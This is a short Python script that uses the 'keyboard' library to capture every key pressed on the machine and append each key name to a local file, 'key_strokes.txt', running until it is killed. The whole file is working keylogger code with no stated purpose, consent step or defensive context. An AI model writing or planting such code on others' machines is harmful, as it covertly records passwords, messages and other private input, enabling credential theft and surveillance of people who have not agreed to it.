import keyboard
keylog = 'key_strokes.txt'
def key_press(event):
  with open(keylog,'a') as f:
    f.write('{}\n'.format(event.name))
keyboard.on_press(key_press)
keyboard.wait()
  


   